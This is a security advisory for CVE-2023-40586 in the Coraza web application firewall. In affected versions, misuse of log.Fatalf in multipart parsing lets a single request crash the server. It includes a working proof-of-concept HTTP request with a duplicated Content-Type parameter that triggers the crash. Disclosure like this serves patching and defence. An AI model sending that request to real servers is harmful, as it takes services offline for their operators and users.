# Coraza has potential denial of service vulnerability

**GHSA**: GHSA-c2pj-v37r-2p6h | **CVE**: CVE-2023-40586 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-400

**Affected Packages**:
- **github.com/corazawaf/coraza/v3** (go): >= 3.0.0, < 3.0.1
- **github.com/corazawaf/coraza/v2** (go): >= 2.0.0, <= 2.0.1

## Description

### Summary

Due to the misuse of `log.Fatalf`, the application using coraza crashed after receiving crafted requests from attackers.

### Details

https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29
The bodyprocessors of multipart uses `log.Fatalf` to handle errors from the `mime.ParseMediaType`, but `log.Fatalf` calls `os.Exit` directly after logging the error.
https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291
This means that the application will immediately crash after receiving a malicious request that triggers an error in `mime.ParseMediaType`.

### PoC

The server can be demonstrated by https://github.com/corazawaf/coraza/tree/main/examples/http-server

After sending this request
```
POST / HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: curl/8.1.2
Accept: */*
Content-Length: 199
Content-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2
Connection: close

--------------------------5fa6351b877326a1
Content-Disposition: form-data; name="file"; filename="123"
Content-Type: application/octet-stream

123

--------------------------5fa6351b877326a1--

```
The server will crash immediately. The `a=1; a=2` in `Content-Type` makes `mime: duplicate parameter name` error.

### Impact

I believe the vulnerability was introduced by the following commit: https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec.

### Mitigation

The error from `mime.ParseMediaType` should return directly.
